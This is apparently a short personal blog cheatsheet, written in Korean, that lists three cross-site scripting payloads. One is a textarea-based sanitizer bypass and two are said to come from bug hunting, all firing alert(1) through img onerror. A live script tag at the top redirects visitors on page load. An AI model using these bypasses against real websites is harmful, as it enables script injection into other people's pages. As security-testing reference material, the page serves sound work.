---
title: XSS Cheatsheet
description: 내가 보려고 만듦
author: goldleo1
date: 2025-02-23 12:00:00 +0800
categories: [cheatsheet]
tags: [web,cheatsheet,xss]
pin: false
---

<script>
location.href="/";
// 이것도 견디지 못하는 자는 돌아가라
</script>

```yaml
# XSS Cheatsheet
LastUpdate: 2025/2/23
Count: 3
```


## Normal

```

```

## Sanitizer Bypass

```
<textarea><input id='</textarea><img src=x onerror=alert(1)>'>
<!-- textarea가 safe로 적용될 때 -->
```


## Real World(From Bug Hunting)

```
{<img src=x onerror=alert(1)>}
<<img>img src=x onerror=alert(1)>
```